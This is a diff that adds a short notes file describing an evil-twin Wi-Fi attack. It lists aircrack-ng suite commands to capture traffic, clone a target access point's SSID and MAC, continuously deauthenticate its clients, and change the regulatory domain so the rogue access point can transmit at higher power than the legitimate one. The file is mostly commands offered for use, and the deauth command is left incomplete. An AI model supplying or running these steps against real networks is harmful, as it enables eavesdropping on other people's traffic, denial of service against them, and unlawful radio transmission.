@@ -1,0 +1,31 @@
+ROGUE ACCESS POINT
+Check wifi status
+
+iwconfig
+
+Start Wireless Interface into Monitor Mode
+---------
+
+airmon-ng start <wireless interface probably wlan0>
+
+Start Traffic Capture
+---------
+
+airodump-ng <wireless interface that is in monitor mode probably wlan0mon>
+
+Create a New AP with same SSID and MAC
+---------
+
+airbase-ng -a <mac address of access point> -essid <name of access point you want to clone> -c <channel> <wireless interface>
+
+Deauthing Access Point
+---------
+
+aireplay-ng --deauth 0 -a <Mac Address of Acces Point
+
+Turn Up The power on our evil access point (we need to be more powerful than the access point we'd like to clone)
+---------
+
+iw reg set BO
+iwconfig <wireless interface> txpower 30
+
